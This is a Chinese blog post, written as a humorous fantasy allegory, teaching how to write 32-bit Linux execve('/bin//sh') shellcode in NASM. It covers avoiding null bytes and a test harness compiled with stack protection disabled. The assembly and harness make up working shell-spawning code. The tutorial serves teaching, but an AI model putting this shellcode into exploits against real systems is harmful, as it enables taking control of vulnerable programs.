---
layout: post
title: "Shellcode: 黑魔法传奇"
excerpt: "Writing your first shellcode"
category: exploit
tags: [shellcode]
disqus: true
---
{% include JB/setup %}

# 引子

多年之后，人们想起早年的尤利克斯黑法师仍然不寒而栗，他们来去无踪，却法力无边。他们出现在暗处低声吟诵不知所云的咒语，黑色的风暴便席卷整个大地，世界都在颤抖。他们不按规矩办事，是的，他们从不可能中创造出奇迹，几乎被奉为神明。

四十年前当炼金术士K&R在著名的贝尔实验室提炼出C元素时，黑魔法便诞生了。然而炼金术士们拒绝为他们符合K哲学的元素添加其它特性，他们想让使用它的法师们拥有更大的自由，嗯，法师们应该自己为自己负责。这种简洁和强大的元素立刻在法师们中流行开来，法师们用C元素重新创建了魔法世界，他们创造了各个大陆：尤利克斯、文都斯、利乐科斯等等，许多快乐的草泥马们无忧无虑地生活在这些繁荣的世界，他们又用C元素创建了因特奈特，将整个宇宙融为一体。是的，这是C的世界。

然而炼金术士们的选择终会付出代价，一些巫师们抓住C元素的不检查数据边界的特性，开发了强大的黑魔法。20世界初期大魔导师汤普森曾经说，在C的世界晴朗的天空中，漂浮着两朵乌云，一朵是黑魔法，一朵是黑魔法师们。是的，这些黑魔法和C的世界一样古老。

虽然那些黑魔法师们很可怕，正直而善良的法师们也没有坐以待毙，他们集结成社，开发了多种黑魔法防御术，建立了各种各样的法师团体替天行道保境安民，著名的有卡巴斯基、啊瓦斯特。但还有些团体在名目张胆研究和尝试新的黑魔法，他们负责测试和演习人们对黑魔法的防御程度，以促进对黑魔法防御术的研究。

多亏具有分享精神的正直法师们，黑魔法逐渐在公众面前揭开了它的迷雾和面纱。我们才知道那不过是一种不按规矩来的法术和一些平常很难用到的咒语而已，并不像魔法世界流行的黑法师泡沫剧中所描述的那样：黑法师们赤手空拳就能摧毁整个C的世界。

本位作者很荣幸翻越了一些魔法禁书，看到了一些神奇的黑魔法，分享出来希望大家喜欢。

## 你不能赤手空拳施法！

是的，起码你需要个魔杖或类似神秘的！电影电视上赤手空拳施法太奇葩了……大多数法器都是法师们由C元素炼成的，他们在C的世界里是真正的奇迹。这里我只列出一些在黑法师手中比较流行的法器：

- 蛇。是的，有群人很喜欢蛇……他们施法时会带上一群蛇，据说第一条C之蛇是由满头长蛇的Guido直接用C炼成的，没人见过他，因为见过它的法师都变成石头了。但是,他把炼蛇之术共知与众，于是他的蛇也因为强大到邪恶被越来越多的法师们作为了法器。
- 红宝石。 第一个C红宝石是十五年前炼成，最初的几年没什么人注意。后来其优良特性和美感吸引了越来越多的人，法师们发现红宝石使用起来灵活且让人快乐。特别是当法师团体买特斯普罗特将其作为其团体成员通用法器之后，红宝石迅速在黑法师团体中流行起来。
- 有群老法师骑着骆驼，至今人们不知道那些法师怎么靠骆驼施法
- 有群法师拿着破壳当法器。可能是贝壳或王八壳或者其它什么果壳之类的，壳不仅仅用来占卜，还可以杀人越货。
- 当然，有些法师只需要C元素就够了……
- 高端的法师甚至知道如何运用C炼成之前的物质
- 还有很多C炼成的工具，在不同大陆却可能不一样。
- 当然还有些很奇怪的人：有群法师骑着一匹快乐的草泥马，他们自称lisp alien。有群法师用咖啡杯做法器。

本文只讨论如何在利乐科斯大陆运用一种古老而优雅的咒语：这种咒语被称作shellcode，通过shellcode，黑法师们可以接管整个C的世界。

好吧，我不扯淡了，在你用python或perl或者其它啥可以被称作脚本语言的语言自动化一切之前，让我们仅仅用些基本的工具来编写shellcode。之后，你应该能综合运用各种法器来自动化你的黑魔法施法过程。

下文我将展示如何在一个现代的gentoo amd64系统上尝试这些古老的黑魔法。看看那些十六进制咒语都是些什么jb东西。

## 准备你的法器

你需要：

- nasm 80x86汇编器，用来获取机器码
- ld - 链接可执行文件
- gcc - 编译器
- man-pages - 系统调用和函数参考
# - objdump - 用来显示目标文件中的信息
- strace - 追踪系统调用和信号
- od - 得到shellcode

最好有：

- prelink -设置堆栈可执行
- vim - 编写shellcode
- gdb - 调试和观察、验证

在gentoo linux中：

emerge gcc gdb binutils nasm prelink vim man-pages

当你碰到问题时，你最好的朋友是Linux Man Pages(利乐科斯大陆法师手册)

首先，建立并进入工作目录。

    ~/Work/notes ⮀ mkdir shellcode
    ~/Work/notes ⮀ cd shellcode

建立一个用来编译并测试最后移除测试程序的shell文件：`test.sh`

    ~/Work/notes/shellcode ⮀ cat >> test.sh << EOF
    heredoc> #! /bin/env bash
    heredoc> nasm "$1" ; 用nasm 获取机器码
    heredoc> 
    heredoc> cat >> test.c << EOF_FLAG ；生成测试shellcode的程序文件
    heredoc> /* shellprogram.c */
    heredoc> char code[] = 
    heredoc> EOF_FLAG
    heredoc> ；生成C数组形式的shellcode并写入测试程序文件 
    heredoc> od -tx1 "`basename "$1" .asm`" | cut -c8-80 | sed -e 's/ /\\x/g' | sed -e 's/^/"/g' | sed -e 's/$/"/g' >> test.c
    heredoc> 
    heredoc> echo "\"\";" >> test.c
    heredoc> ;主程序 
    heredoc> cat >> test.c << EOF_FLAG
    heredoc> int main(int argc, char *argv[])
    heredoc> {
    heredoc>   int (*exeshell)();
    heredoc>   exeshell = (int (*)()) code;
    heredoc>   (int)(*exeshell)();
    heredoc> }
    heredoc> EOF_FLAG
    heredoc> ;编译程序并清理
    heredoc> gcc -fno-stack-protector -z execstack -m32 -o tester test.c
    heredoc> rm test.c
    heredoc> EOF

这个文件会之后生成一个`tester`用来测试我们的shellcode

## 编写Shellcode黑魔法咒语

在Linux系统中，法师们可以通过系统调用(syscall)直接和内核交互，这使得在Linux下编写shellcode非常直观方便。你可以在网上找到Linux系统调用的快速参考表格，这些系统调用经久不变。你可以这样快速查找调用号。当然可以把以下内容写成个简易脚本来减少击键次数。

    ~/Work/notes/shellcode ⮀ cat /usr/include/asm/unistd_32.h | grep execve
    #define __NR_execve 11

使用汇编来进行系统调用很直观，首先，32位cpu有8个通用寄存器(分别称为eax, ebx, ecx， edx, esi, edi, ebp, esp)，如何使用他们通常约定俗成。你需要把查找到的调用号推入eax中, 借着把该调用的参数依次推入ebx， ecx， edx， esi， edi，紧接着是一个`int 0x80`中断表示参数和调用哪个函数都指定了，现在可以开始调用了。

那么这些系统调用的参数如何查阅呢？俗话说男人最重要，谷哥是其次。这时候就man吧，比如查看`execve`用法

    ~/Work/notes/shellcode ⮀ man execve
    .... Lots of things.....
    SYNOPSIS
           #include <unistd.h>
    
           int execve(const char *filename, char *const argv[],
                      char *const envp[]);
    
在综述中(Synopsis)可以看到函数原型，那些参数就是要推入ebx， ecx， edx的东西。

但是怎么把`const char *filename`这些参数推入寄存器中呢？这时候就要利用栈了(stack)我们把参数推到栈上，然后把地址推入寄存器。

首先我们看看如何把调用号推入eax中

为了使shellcode中不包含`\x00`即C语言中的NULL(至于为什么，这些字符是字符串定届符，而shellcode很多是通过字符串注入，如果shellcode中包含这种字符，显然会被截断)，我们不能直接这样

    mov eax，0xb

这里我用的是metasploit项目tools中的`nasm_shell.rb`，可以很方便的用来查看汇编对应的机器码。

    nasm > mov eax, 0xb
    00000000  B80B000000        mov eax,0xb

显然有好多0,因为我们mov时mov的是整个32位0xb，我们可以先将eax通过xor运算变为0，再将0xb推入低十六位。

    nasm > xor eax, eax
    00000000  31C0              xor eax,eax
    nasm > mov al, 0xb
    00000000  B00B              mov al,0xb

还有能让shellcode更短的方法，这个方法利用了栈。向栈推入一子节的0xb，然后弹出到eax中。你总是希望shellcode更短，shellcode越短，能运用的范围就越大。

    nasm > push BYTE 11
    00000000  6A0B              push byte +0xb
    nasm > pop eax
    00000000  58                pop eax

接着让我们看看如何把参数依次推入ebx， ecx和edx。为了清晰起见再次将综述列到下面。

    #include <unistd.h>

    int execve(const char *filename, char *const argv[],
               char *const envp[]);

我们要想在shellcode中运行一个shell(这就是为何称为shellcode，获取控制的顶尖方法)可以`int execve(address of "/bin//sh", address of ["/bin//sh", NULL], NULL)`

shellcode中的地址都应该是相对取地址，因为不知道shellcode会被注入到程序的哪些部分，任何硬编码都是不可取的。

我们利用栈完成一切相对取址。通过操作我们使栈顶看起来这样

    +++++
    "bin/"  <-- 地址1：四字节，32位字符串,同时这里是栈顶，即esp(在ia32架构中是这样)
    +++++
    "//sh"  <-- 地址2：32位字符串，//在unix系统中与/并无区别
    +++++
    NULL    <-- 地址：空字符NULL
    ......

这是这几步

    xor ecx, ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp

你好奇那些`0x687322f2f`什么的怎么来的？

    ~/Work/notes/shellcode ⮀ echo -ne "/bin//sh" |od -tx4
    0000000 6e69622f 68732f2f
    

将esp即字符串`"/bin//sh"`的地址推入ebx，推入第一个参数。之后将一个NULL推入栈，栈变成这样

    +++++
    NULL    <-- 新栈顶，NULL
    +++++
    "bin/"  <-- 地址1：四字节，32位字符串地址
    +++++
    "//sh"  <-- 地址2：32位字符串，//在unix系统中与/并无区别
    +++++
    NULL    <-- 地址3：空字符NULL，界定字符串
    ......

这几步如下，将NULL的地址推入edx

    push ecx
    xor edx, edx
    mov edx, esp

把字符串的地址推入栈，则栈如下所示：

    +++++
    地址1   <-- 新栈顶esp，也是数组[address of "/bin//sh", NULL]的地址
    +++++
    NULL    <-- NULL
    +++++
    "bin/"  <-- 地址1：四字节，32位字符串地址
    +++++
    "//sh"  <-- 地址2：32位字符串，//在unix系统中与/并无区别
    +++++
    NULL    <-- 地址3：空字符NULL，界定字符串
    ......

这几步如下所示：

    push ebx
    mov ecx, esp

接着，各个参数都已经推入相应寄存器，直接开始调用`int 0x80`

## 验证我们的咒语

把你的shellcode保存为任意以`.asm`为后缀的文件。比如`shellcode.asm`

用之前我们的测试脚本生成可执行文件：

    ~/Work/notes/shellcode ⮀ sh test.sh shellcode.asm
    ~/Work/notes/shellcode ⮀ ./tester
    sh-4.2$ 

Works perfectly!

## What' more

这些咒语其实很复杂，这篇文章只是匆匆一瞥。要想了解更多请参阅文末的那些魔法禁书：）

## 魔法禁书目录

- 善良人手册《shellcoder‘s handbook》
- 黑魔法：挖财宝的艺术《Hacking：the art of exploition》

同学们，因特奈特上都有中文版的！
